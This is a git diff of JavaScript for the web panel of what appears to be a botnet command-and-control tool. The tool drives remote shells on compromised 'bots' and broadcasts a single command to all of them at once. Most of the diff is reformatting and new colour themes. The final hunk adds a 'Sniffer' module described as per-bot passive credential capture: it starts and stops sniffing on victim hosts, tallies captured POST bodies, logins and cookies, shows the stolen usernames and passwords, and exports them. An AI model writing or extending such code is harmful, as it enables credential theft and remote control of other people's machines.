   var broadcast = document.getElementById('shell-broadcast');
@@ -5283,16 +6036,16 @@ function addEmptyPane(grid, index) {
   pane.id = 'shell-pane-' + index;
   pane.innerHTML =
     '<div class="pane-header">' +
-      '<span class="pane-botid">Empty Pane</span>' +
-      '<select class="pane-bot-select" onchange="attachBotToPane(this,' + index + ')" style="background:var(--bg-input,#0d1117);color:var(--text-primary);border:1px solid var(--border,#30363d);border-radius:4px;padding:2px 6px;font-size:11px;max-width:180px">' +
-        '<option value="">-- Select Bot --</option>' +
-      '</select>' +
-      '<button class="pane-close" onclick="removePane(' + index + ')">&times;</button>' +
+    '<span class="pane-botid">Empty Pane</span>' +
+    '<select class="pane-bot-select" onchange="attachBotToPane(this,' + index + ')" style="background:var(--bg-input,#0d1117);color:var(--text-primary);border:1px solid var(--border,#30363d);border-radius:4px;padding:2px 6px;font-size:11px;max-width:180px">' +
+    '<option value="">-- Select Bot --</option>' +
+    '</select>' +
+    '<button class="pane-close" onclick="removePane(' + index + ')">&times;</button>' +
     '</div>' +
     '<div class="shell-body" style="flex:1;display:flex;align-items:center;justify-content:center;color:var(--text-dim);font-size:13px">Select a bot above</div>';
   // Populate bot select
   var sel = pane.querySelector('.pane-bot-select');
-  Object.keys(botState).forEach(function(id) {
+  Object.keys(botState).forEach(function (id) {
     var opt = document.createElement('option');
     opt.value = id;
     opt.textContent = id + ' (' + botState[id].ip + ')';
@@ -5310,25 +6063,25 @@ function attachBotToPane(sel, index) {
   // Build a mini terminal in this pane
   pane.innerHTML =
     '<div class="pane-header">' +
-      '<span class="pane-botid">' + escHtml(botID) + '</span>' +
-      '<span style="color:var(--text-dim);font-size:11px">' + escHtml((botState[botID] || {}).ip || '') + '</span>' +
-      '<button class="pane-close" onclick="removePane(' + index + ')">&times;</button>' +
+    '<span class="pane-botid">' + escHtml(botID) + '</span>' +
+    '<span style="color:var(--text-dim);font-size:11px">' + escHtml((botState[botID] || {}).ip || '') + '</span>' +
+    '<button class="pane-close" onclick="removePane(' + index + ')">&times;</button>' +
     '</div>' +
     '<div class="shell-body" style="flex:1;display:flex;flex-direction:column;overflow:hidden">' +
-      '<div class="shell-terminal" style="flex:1;display:flex;flex-direction:column;overflow:hidden">' +
-        '<div class="shell-output" id="pane-output-' + index + '" style="flex:1;overflow-y:auto;padding:8px;font-family:monospace;font-size:13px"></div>' +
-        '<div class="shell-input-row" style="padding:4px 8px">' +
-          '<span class="prompt">$</span>' +
-          '<input type="text" id="pane-input-' + index + '" placeholder="Command..." autocomplete="off" spellcheck="false" style="flex:1;background:transparent;border:none;color:var(--text-primary);font-family:monospace;font-size:13px;outline:none">' +
-        '</div>' +
-      '</div>' +
+    '<div class="shell-terminal" style="flex:1;display:flex;flex-direction:column;overflow:hidden">' +
+    '<div class="shell-output" id="pane-output-' + index + '" style="flex:1;overflow-y:auto;padding:8px;font-family:monospace;font-size:13px"></div>' +
+    '<div class="shell-input-row" style="padding:4px 8px">' +
+    '<span class="prompt">$</span>' +
+    '<input type="text" id="pane-input-' + index + '" placeholder="Command..." autocomplete="off" spellcheck="false" style="flex:1;background:transparent;border:none;color:var(--text-primary);font-family:monospace;font-size:13px;outline:none">' +
+    '</div>' +
+    '</div>' +
     '</div>';
 
   // Apply current theme
   var savedTheme = localStorage.getItem('armada_shell_theme');
   if (savedTheme) {
     var outputs = pane.querySelectorAll('.shell-output');
-    outputs.forEach(function(el) { applyShellTheme(savedTheme); });
+    outputs.forEach(function (el) { applyShellTheme(savedTheme); });
   }
 
   // Connect WebSocket
@@ -5337,7 +6090,7 @@ function attachBotToPane(sel, index) {
   pane._ws = ws;
 
   var output = document.getElementById('pane-output-' + index);
-  ws.onmessage = function(e) {
+  ws.onmessage = function (e) {
     if (!output) return;
     var line = document.createElement('div');
     line.textContent = e.data;
@@ -5347,7 +6100,7 @@ function attachBotToPane(sel, index) {
 
   var input = document.getElementById('pane-input-' + index);
   if (input) {
-    input.onkeydown = function(ev) {
+    input.onkeydown = function (ev) {
       if (ev.key === 'Enter' && input.value.trim()) {
         ws.send(JSON.stringify({ type: 'command', command: input.value.trim() }));
         var echo = document.createElement('div');
@@ -5370,7 +6123,7 @@ function removePane(index) {
 
 function broadcastShellCmd(cmd) {
   if (!cmd.trim()) return;
-  document.querySelectorAll('.shell-pane').forEach(function(pane) {
+  document.querySelectorAll('.shell-pane').forEach(function (pane) {
     if (pane._ws && pane._ws.readyState === 1) {
       pane._ws.send(JSON.stringify({ type: 'command', command: cmd.trim() }));
     }
@@ -5382,18 +6135,19 @@ function broadcastShellCmd(cmd) {
 // TERMINAL THEMES
 // ===========================================================================
 var SHELL_THEMES = {
-  default:   { name:'Default',   bg:'#0d1117', fg:'#c9d1d9', cursor:'#58a6ff', black:'#0d1117', red:'#ff7b72', green:'#3fb950', yellow:'#d29922', blue:'#58a6ff', magenta:'#bc8cff', cyan:'#39d353', white:'#c9d1d9', brightBlack:'#484f58', brightRed:'#ffa198', brightGreen:'#56d364', brightYellow:'#e3b341', brightBlue:'#79c0ff', brightMagenta:'#d2a8ff', brightCyan:'#56d364', brightWhite:'#f0f6fc' },
-  monokai:   { name:'Monokai',   bg:'#272822', fg:'#f8f8f2', cursor:'#f92672', black:'#272822', red:'#f92672', green:'#a6e22e', yellow:'#f4bf75', blue:'#66d9ef', magenta:'#ae81ff', cyan:'#a1efe4', white:'#f8f8f2', brightBlack:'#75715e', brightRed:'#f92672', brightGreen:'#a6e22e', brightYellow:'#f4bf75', brightBlue:'#66d9ef', brightMagenta:'#ae81ff', brightCyan:'#a1efe4', brightWhite:'#f9f8f5' },
-  dracula:   { name:'Dracula',   bg:'#282a36', fg:'#f8f8f2', cursor:'#ff79c6', black:'#21222c', red:'#ff5555', green:'#50fa7b', yellow:'#f1fa8c', blue:'#bd93f9', magenta:'#ff79c6', cyan:'#8be9fd', white:'#f8f8f2', brightBlack:'#6272a4', brightRed:'#ff6e6e', brightGreen:'#69ff94', brightYellow:'#ffffa5', brightBlue:'#d6acff', brightMagenta:'#ff92df', brightCyan:'#a4ffff', brightWhite:'#ffffff' },
-  solarized: { name:'Solarized', bg:'#002b36', fg:'#839496', cursor:'#268bd2', black:'#073642', red:'#dc322f', green:'#859900', yellow:'#b58900', blue:'#268bd2', magenta:'#d33682', cyan:'#2aa198', white:'#eee8d5', brightBlack:'#586e75', brightRed:'#cb4b16', brightGreen:'#586e75', brightYellow:'#657b83', brightBlue:'#839496', brightMagenta:'#6c71c4', brightCyan:'#93a1a1', brightWhite:'#fdf6e3' },
-  nord:      { name:'Nord',      bg:'#2e3440', fg:'#d8dee9', cursor:'#88c0d0', black:'#3b4252', red:'#bf616a', green:'#a3be8c', yellow:'#ebcb8b', blue:'#81a1c1', magenta:'#b48ead', cyan:'#88c0d0', white:'#e5e9f0', brightBlack:'#4c566a', brightRed:'#bf616a', brightGreen:'#a3be8c', brightYellow:'#ebcb8b', brightBlue:'#81a1c1', brightMagenta:'#b48ead', brightCyan:'#8fbcbb', brightWhite:'#eceff4' },
-  matrix:    { name:'Matrix',    bg:'#0a0a0a', fg:'#00ff41', cursor:'#00ff41', black:'#0a0a0a', red:'#00ff41', green:'#00ff41', yellow:'#33ff66', blue:'#00cc33', magenta:'#00ff41', cyan:'#33ff66', white:'#00ff41', brightBlack:'#003300', brightRed:'#33ff66', brightGreen:'#33ff66', brightYellow:'#66ff99', brightBlue:'#33ff66', brightMagenta:'#33ff66', brightCyan:'#66ff99', brightWhite:'#ccffcc' }
+  default: { name: 'Default', bg: '#0d1117', fg: '#c9d1d9', cursor: '#58a6ff', black: '#0d1117', red: '#ff7b72', green: '#3fb950', yellow: '#d29922', blue: '#58a6ff', magenta: '#bc8cff', cyan: '#39d353', white: '#c9d1d9', brightBlack: '#484f58', brightRed: '#ffa198', brightGreen: '#56d364', brightYellow: '#e3b341', brightBlue: '#79c0ff', brightMagenta: '#d2a8ff', brightCyan: '#56d364', brightWhite: '#f0f6fc' },
+  light: { name: 'Light', bg: '#ffffff', fg: '#1f1f1f', cursor: '#7c3aed', black: '#000000', red: '#d93025', green: '#0d904f', yellow: '#e37400', blue: '#1a73e8', magenta: '#7c3aed', cyan: '#007b83', white: '#ffffff', brightBlack: '#5f6368', brightRed: '#ea4335', brightGreen: '#34a853', brightYellow: '#fbbc04', brightBlue: '#4285f4', brightMagenta: '#9334e6', brightCyan: '#24c1e0', brightWhite: '#ffffff' },
+  monokai: { name: 'Monokai', bg: '#272822', fg: '#f8f8f2', cursor: '#f92672', black: '#272822', red: '#f92672', green: '#a6e22e', yellow: '#f4bf75', blue: '#66d9ef', magenta: '#ae81ff', cyan: '#a1efe4', white: '#f8f8f2', brightBlack: '#75715e', brightRed: '#f92672', brightGreen: '#a6e22e', brightYellow: '#f4bf75', brightBlue: '#66d9ef', brightMagenta: '#ae81ff', brightCyan: '#a1efe4', brightWhite: '#f9f8f5' },
+  dracula: { name: 'Dracula', bg: '#282a36', fg: '#f8f8f2', cursor: '#ff79c6', black: '#21222c', red: '#ff5555', green: '#50fa7b', yellow: '#f1fa8c', blue: '#bd93f9', magenta: '#ff79c6', cyan: '#8be9fd', white: '#f8f8f2', brightBlack: '#6272a4', brightRed: '#ff6e6e', brightGreen: '#69ff94', brightYellow: '#ffffa5', brightBlue: '#d6acff', brightMagenta: '#ff92df', brightCyan: '#a4ffff', brightWhite: '#ffffff' },
+  solarized: { name: 'Solarized', bg: '#002b36', fg: '#839496', cursor: '#268bd2', black: '#073642', red: '#dc322f', green: '#859900', yellow: '#b58900', blue: '#268bd2', magenta: '#d33682', cyan: '#2aa198', white: '#eee8d5', brightBlack: '#586e75', brightRed: '#cb4b16', brightGreen: '#586e75', brightYellow: '#657b83', brightBlue: '#839496', brightMagenta: '#6c71c4', brightCyan: '#93a1a1', brightWhite: '#fdf6e3' },
+  nord: { name: 'Nord', bg: '#2e3440', fg: '#d8dee9', cursor: '#88c0d0', black: '#3b4252', red: '#bf616a', green: '#a3be8c', yellow: '#ebcb8b', blue: '#81a1c1', magenta: '#b48ead', cyan: '#88c0d0', white: '#e5e9f0', brightBlack: '#4c566a', brightRed: '#bf616a', brightGreen: '#a3be8c', brightYellow: '#ebcb8b', brightBlue: '#81a1c1', brightMagenta: '#b48ead', brightCyan: '#8fbcbb', brightWhite: '#eceff4' },
+  matrix: { name: 'Matrix', bg: '#0a0a0a', fg: '#00ff41', cursor: '#00ff41', black: '#0a0a0a', red: '#00ff41', green: '#00ff41', yellow: '#33ff66', blue: '#00cc33', magenta: '#00ff41', cyan: '#33ff66', white: '#00ff41', brightBlack: '#003300', brightRed: '#33ff66', brightGreen: '#33ff66', brightYellow: '#66ff99', brightBlue: '#33ff66', brightMagenta: '#33ff66', brightCyan: '#66ff99', brightWhite: '#ccffcc' }
 };
 
 function applyShellTheme(name) {
   var theme = SHELL_THEMES[name];
   if (!theme) return;
-  document.querySelectorAll('.shell-output').forEach(function(el) {
+  document.querySelectorAll('.shell-output').forEach(function (el) {
     el.style.setProperty('--term-bg', theme.bg);
     el.style.setProperty('--term-fg', theme.fg);
     el.style.setProperty('--term-cursor', theme.cursor);
@@ -5416,14 +6170,31 @@ function applyShellTheme(name) {
     el.style.background = theme.bg;
     el.style.color = theme.fg;
   });
+  // Update xterm.js PTY terminal if open
+  if (typeof ptyTerm !== 'undefined' && ptyTerm) {
+    ptyTerm.options.theme = {
+      background: theme.bg,
+      foreground: theme.fg,
+      cursor: theme.cursor,
+      selectionBackground: theme.bg === '#ffffff' ? '#b4d7ff' : '#264f78',
+      black: theme.black,
+      red: theme.red,
+      green: theme.green,
+      yellow: theme.yellow,
+      blue: theme.blue,
+      magenta: theme.magenta,
+      cyan: theme.cyan,
+      white: theme.white
+    };
+  }
   localStorage.setItem('armada_shell_theme', name);
 }
 
 // Populate shell theme picker on load
-(function() {
+(function () {
   var picker = document.getElementById('shell-theme-picker');
   if (!picker) return;
-  Object.keys(SHELL_THEMES).forEach(function(key) {
+  Object.keys(SHELL_THEMES).forEach(function (key) {
     var opt = document.createElement('option');
     opt.value = key;
     opt.textContent = SHELL_THEMES[key].name;
@@ -5440,20 +6211,25 @@ function applyShellTheme(name) {
 // GLOBAL PANEL THEMES
 // ===========================================================================
 var GLOBAL_THEMES = {
-  default:   { name:'Default (Dark)',  bgBase:'#06080c', bgPrimary:'#0c1018', bgCard:'#111827', bgCardHover:'#1a2332', bgInput:'#0f1520', bgElevated:'#182234', border:'#1e2d3d', borderLight:'#253344', text:'#e2e8f0', textMuted:'#64748b', textDim:'#475569', accent:'#8b5cf6', accentHover:'#7c3aed', green:'#22c55e', red:'#ef4444', yellow:'#eab308', blue:'#3b82f6', cyan:'#06b6d4', headerBg:'rgba(12,16,24,0.8)' },
-  monokai:   { name:'Monokai',         bgBase:'#1a1a17', bgPrimary:'#272822', bgCard:'#2e2f28', bgCardHover:'#3a3b32', bgInput:'#1e1f1a', bgElevated:'#3e3d32', border:'#49483e', borderLight:'#5a5949', text:'#f8f8f2', textMuted:'#a59f85', textDim:'#75715e', accent:'#f92672', accentHover:'#e6195f', green:'#a6e22e', red:'#f92672', yellow:'#e6db74', blue:'#66d9ef', cyan:'#a1efe4', headerBg:'rgba(39,40,34,0.9)' },
-  dracula:   { name:'Dracula',         bgBase:'#1e1f29', bgPrimary:'#282a36', bgCard:'#2d2f3d', bgCardHover:'#343746', bgInput:'#21222c', bgElevated:'#383a4a', border:'#44475a', borderLight:'#555869', text:'#f8f8f2', textMuted:'#8a8ea0', textDim:'#6272a4', accent:'#bd93f9', accentHover:'#a87cf5', green:'#50fa7b', red:'#ff5555', yellow:'#f1fa8c', blue:'#8be9fd', cyan:'#8be9fd', headerBg:'rgba(40,42,54,0.9)' },
-  solarized: { name:'Solarized Dark',  bgBase:'#001e26', bgPrimary:'#002b36', bgCard:'#073642', bgCardHover:'#0a4050', bgInput:'#002028', bgElevated:'#0a4050', border:'#2a5a68', borderLight:'#3a6a78', text:'#839496', textMuted:'#657b83', textDim:'#586e75', accent:'#268bd2', accentHover:'#1a7ab8', green:'#859900', red:'#dc322f', yellow:'#b58900', blue:'#268bd2', cyan:'#2aa198', headerBg:'rgba(0,43,54,0.9)' },
-  nord:      { name:'Nord',            bgBase:'#242933', bgPrimary:'#2e3440', bgCard:'#3b4252', bgCardHover:'#434c5e', bgInput:'#2a303c', bgElevated:'#434c5e', border:'#4c566a', borderLight:'#5c6678', text:'#d8dee9', textMuted:'#9ba4b5', textDim:'#7b849a', accent:'#88c0d0', accentHover:'#7ab3c3', green:'#a3be8c', red:'#bf616a', yellow:'#ebcb8b', blue:'#81a1c1', cyan:'#88c0d0', headerBg:'rgba(46,52,64,0.9)' },
-  matrix:    { name:'Matrix',          bgBase:'#030503', bgPrimary:'#0a0a0a', bgCard:'#0f120f', bgCardHover:'#151a15', bgInput:'#060806', bgElevated:'#151a15', border:'#1a2e1a', borderLight:'#254025', text:'#00ff41', textMuted:'#00aa2a', textDim:'#007718', accent:'#00ff41', accentHover:'#33ff66', green:'#00ff41', red:'#ff0000', yellow:'#33ff66', blue:'#00cc33', cyan:'#33ff66', headerBg:'rgba(10,10,10,0.9)' }
+  default: { name: 'Default (Dark)', bgBase: '#06080c', bgPrimary: '#0c1018', bgCard: '#111827', bgCardHover: '#1a2332', bgInput: '#0f1520', bgElevated: '#182234', border: '#1e2d3d', borderLight: '#253344', text: '#e2e8f0', textMuted: '#64748b', textDim: '#475569', accent: '#8b5cf6', accentHover: '#7c3aed', green: '#22c55e', red: '#ef4444', yellow: '#eab308', blue: '#3b82f6', cyan: '#06b6d4', headerBg: 'rgba(12,16,24,0.8)' },
+  light: { name: 'Light', bgBase: '#f5f5f5', bgPrimary: '#ffffff', bgCard: '#ffffff', bgCardHover: '#f0f0f3', bgInput: '#f5f5f5', bgElevated: '#e8eaed', border: '#dadce0', borderLight: '#c4c7cc', text: '#1f1f1f', textMuted: '#5f6368', textDim: '#80868b', accent: '#7c3aed', accentHover: '#6d28d9', green: '#0d904f', red: '#d93025', yellow: '#e37400', blue: '#1a73e8', cyan: '#007b83', headerBg: 'rgba(255,255,255,0.85)' },
+  monokai: { name: 'Monokai', bgBase: '#1a1a17', bgPrimary: '#272822', bgCard: '#2e2f28', bgCardHover: '#3a3b32', bgInput: '#1e1f1a', bgElevated: '#3e3d32', border: '#49483e', borderLight: '#5a5949', text: '#f8f8f2', textMuted: '#a59f85', textDim: '#75715e', accent: '#f92672', accentHover: '#e6195f', green: '#a6e22e', red: '#f92672', yellow: '#e6db74', blue: '#66d9ef', cyan: '#a1efe4', headerBg: 'rgba(39,40,34,0.9)' },
+  dracula: { name: 'Dracula', bgBase: '#1e1f29', bgPrimary: '#282a36', bgCard: '#2d2f3d', bgCardHover: '#343746', bgInput: '#21222c', bgElevated: '#383a4a', border: '#44475a', borderLight: '#555869', text: '#f8f8f2', textMuted: '#8a8ea0', textDim: '#6272a4', accent: '#bd93f9', accentHover: '#a87cf5', green: '#50fa7b', red: '#ff5555', yellow: '#f1fa8c', blue: '#8be9fd', cyan: '#8be9fd', headerBg: 'rgba(40,42,54,0.9)' },
+  solarized: { name: 'Solarized Dark', bgBase: '#001e26', bgPrimary: '#002b36', bgCard: '#073642', bgCardHover: '#0a4050', bgInput: '#002028', bgElevated: '#0a4050', border: '#2a5a68', borderLight: '#3a6a78', text: '#839496', textMuted: '#657b83', textDim: '#586e75', accent: '#268bd2', accentHover: '#1a7ab8', green: '#859900', red: '#dc322f', yellow: '#b58900', blue: '#268bd2', cyan: '#2aa198', headerBg: 'rgba(0,43,54,0.9)' },
+  nord: { name: 'Nord', bgBase: '#242933', bgPrimary: '#2e3440', bgCard: '#3b4252', bgCardHover: '#434c5e', bgInput: '#2a303c', bgElevated: '#434c5e', border: '#4c566a', borderLight: '#5c6678', text: '#d8dee9', textMuted: '#9ba4b5', textDim: '#7b849a', accent: '#88c0d0', accentHover: '#7ab3c3', green: '#a3be8c', red: '#bf616a', yellow: '#ebcb8b', blue: '#81a1c1', cyan: '#88c0d0', headerBg: 'rgba(46,52,64,0.9)' },
+  matrix: { name: 'Matrix', bgBase: '#030503', bgPrimary: '#0a0a0a', bgCard: '#0f120f', bgCardHover: '#151a15', bgInput: '#060806', bgElevated: '#151a15', border: '#1a2e1a', borderLight: '#254025', text: '#00ff41', textMuted: '#00aa2a', textDim: '#007718', accent: '#00ff41', accentHover: '#33ff66', green: '#00ff41', red: '#ff0000', yellow: '#33ff66', blue: '#00cc33', cyan: '#33ff66', headerBg: 'rgba(10,10,10,0.9)' }
 };
 
 function applyGlobalTheme(name) {
   var t = GLOBAL_THEMES[name];
   if (!t) return;
   var r = document.documentElement;
-  // Remove light theme if set
-  r.removeAttribute('data-theme');
+  // Set or remove light theme attribute
+  if (name === 'light') {
+    r.setAttribute('data-theme', 'light');
+  } else {
+    r.removeAttribute('data-theme');
+  }
   r.style.setProperty('--bg-base', t.bgBase);
   r.style.setProperty('--bg-primary', t.bgPrimary);
   r.style.setProperty('--bg-card', t.bgCard);
@@ -5489,10 +6265,10 @@ function applyGlobalTheme(name) {
 }
 
 // Populate global theme picker and restore saved
-(function() {
+(function () {
   var picker = document.getElementById('global-theme-picker');
   if (!picker) return;
-  Object.keys(GLOBAL_THEMES).forEach(function(key) {
+  Object.keys(GLOBAL_THEMES).forEach(function (key) {
     var opt = document.createElement('option');
     opt.value = key;
     opt.textContent = GLOBAL_THEMES[key].name;
@@ -5505,3 +6281,148 @@ function applyGlobalTheme(name) {
   }
 })();
 
+// ---------------------------------------------------------------------------
+// Sniffer — per-bot passive credential capture
+// ---------------------------------------------------------------------------
+
+var _sniffActiveBotID = '';
+
+function snifferRefresh() {
+  // Populate bot dropdown from current bot table
+  var sel = document.getElementById('sniff-bot');
+  if (!sel) return;
+  var rows = document.querySelectorAll('.bot-row');
+  var prev = sel.value;
+  sel.innerHTML = '<option value="">Select a bot...</option>';
+  rows.forEach(function (row) {
+    var id = row.getAttribute('data-botid');
+    if (id) {
+      var opt = document.createElement('option');
+      opt.value = id;
+      opt.textContent = id;
+      sel.appendChild(opt);
+    }
+  });
+  if (prev) sel.value = prev;
+}
+
+function snifferStart() {
+  var botID = document.getElementById('sniff-bot').value;
+  if (!botID) { showToast('Select a bot first', false); return; }
+  var logpath = document.getElementById('sniff-logpath').value.trim() || '/tmp/.sniff.log';
+  _sniffActiveBotID = botID;
+  fetch('/api/command', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ command: '!sniff ' + logpath, botID: botID })
+  }).then(function (r) { return r.json(); }).then(function (d) {
+    showToast(d.message || 'Sniffer start sent', d.success !== false);
+    document.getElementById('sniff-status').textContent = 'Starting on ' + botID + '...';
+    sniffLog('Sent !sniff ' + logpath + ' to ' + botID);
+  }).catch(function () { showToast('Request failed', false); });
+}
+
+function snifferStop() {
+  var botID = document.getElementById('sniff-bot').value || _sniffActiveBotID;
+  if (!botID) { showToast('Select a bot first', false); return; }
+  fetch('/api/command', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ command: '!stopsniff', botID: botID })
+  }).then(function (r) { return r.json(); }).then(function (d) {
+    showToast(d.message || 'Sniffer stop sent', d.success !== false);
+    document.getElementById('sniff-status').textContent = 'Stopped';
+    sniffLog('Sent !stopsniff to ' + botID);
+  }).catch(function () { showToast('Request failed', false); });
+}
+
+function snifferDownloadLog() {
+  window.location = '/api/hits/export?mod=sniff&format=csv';
+}
+
+function handleSniffStats(data) {
+  // data = { botID: "...", raw: "SNIFF|post:N|basic:N|cookie:N|url:N|total:N" }
+  if (!data || !data.raw) return;
+  var parts = data.raw.split('|');
+  var vals = {};
+  for (var i = 1; i < parts.length; i++) {
+    var kv = parts[i].split(':');
+    if (kv.length === 2) vals[kv[0]] = parseInt(kv[1], 10) || 0;
+  }
+  var el;
+  el = document.getElementById('sniff-cnt-post'); if (el) el.textContent = vals.post || 0;
+  el = document.getElementById('sniff-cnt-basic'); if (el) el.textContent = vals.basic || 0;
+  el = document.getElementById('sniff-cnt-cookie'); if (el) el.textContent = vals.cookie || 0;
+  el = document.getElementById('sniff-cnt-url'); if (el) el.textContent = vals.url || 0;
+  el = document.getElementById('sniff-cnt-total'); if (el) el.textContent = vals.total || 0;
+
+  sniffLog('[' + data.botID + '] post:' + (vals.post || 0) + ' basic:' + (vals.basic || 0) +
+    ' cookie:' + (vals.cookie || 0) + ' url:' + (vals.url || 0) + ' total:' + (vals.total || 0));
+
+  var status = document.getElementById('sniff-status');
+  if (status) status.textContent = 'Running on ' + data.botID + ' — ' + (vals.total || 0) + ' hits';
+}
+
+function sniffLog(msg) {
+  var el = document.getElementById('sniff-log');
+  if (!el) return;
+  var ts = new Date().toLocaleTimeString();
+  var line = document.createElement('div');
+  line.textContent = '[' + ts + '] ' + msg;
+  el.appendChild(line);
+  el.scrollTop = el.scrollHeight;
+  // Keep last 200 lines
+  while (el.childNodes.length > 200) el.removeChild(el.firstChild);
+}
+
+// --- Sniff Hits Table ---
+
+function handleSniffHitSSE(hit) {
+  // Real-time: prepend to table
+  var tbody = document.getElementById('sniff-hits-tbody');
+  if (!tbody) return;
+  var tr = document.createElement('tr');
+  var typeColors = { post: 'var(--green)', basic: 'var(--cyan)', cookie: 'var(--orange,#f0883e)', url: 'var(--purple,#a371f7)' };
+  var ts = hit.t ? new Date(hit.t).toLocaleTimeString() : '';
+  tr.innerHTML =
+    '<td style="color:' + (typeColors[hit.sniffType] || 'var(--text)') + ';font-weight:700">' + escHtml(hit.sniffType || '') + '</td>' +
+    '<td>' + escHtml(hit.ip || '') + '</td>' +
+    '<td>' + escHtml(hit.user || '') + '</td>' +
+    '<td>' + escHtml(hit.pass || '') + '</td>' +
+    '<td style="font-size:11px;opacity:0.7">' + escHtml(hit.botID || '') + '</td>' +
+    '<td style="font-size:11px;opacity:0.6">' + ts + '</td>';
+  tbody.insertBefore(tr, tbody.firstChild);
+  sniffLog('HIT [' + (hit.sniffType || '?') + '] ' + (hit.ip || '?') + ' ' + (hit.user || '') + ':' + (hit.pass || ''));
+}
+
+function sniffRefreshHits() {
+  fetch('/api/hits?mod=sniff&limit=500').then(function (r) { return r.json(); }).then(function (hits) {
+    var tbody = document.getElementById('sniff-hits-tbody');
+    if (!tbody) return;
+    tbody.innerHTML = '';
+    var typeColors = { post: 'var(--green)', basic: 'var(--cyan)', cookie: 'var(--orange,#f0883e)', url: 'var(--purple,#a371f7)' };
+    (hits || []).reverse().forEach(function (h) {
+      var tr = document.createElement('tr');
+      var ts = h.t ? new Date(h.t).toLocaleTimeString() : '';
+      tr.innerHTML =
+        '<td style="color:' + (typeColors[h.sniffType] || 'var(--text)') + ';font-weight:700">' + escHtml(h.sniffType || '') + '</td>' +
+        '<td>' + escHtml(h.ip || '') + '</td>' +
+        '<td>' + escHtml(h.user || '') + '</td>' +
+        '<td>' + escHtml(h.pass || '') + '</td>' +
+        '<td style="font-size:11px;opacity:0.7">' + escHtml(h.botID || '') + '</td>' +
+        '<td style="font-size:11px;opacity:0.6">' + ts + '</td>';
+      tbody.appendChild(tr);
+    });
+  }).catch(function () { showToast('Failed to load sniff hits', false); });
+}
+
+function sniffExportCSV() { window.location = '/api/hits/export?mod=sniff&format=csv'; }
+function sniffExportTxt() { window.location = '/api/hits/export?mod=sniff&format=txt'; }
+
+function sniffClearHits() {
+  if (!confirm('Clear all sniff hits?')) return;
+  fetch('/api/hits?mod=sniff', { method: 'DELETE' }).then(function (r) { return r.json(); }).then(function () {
+    showToast('Sniff hits cleared', true);
+    document.getElementById('sniff-hits-tbody').innerHTML = '';
+  }).catch(function () { showToast('Failed', false); });
+}
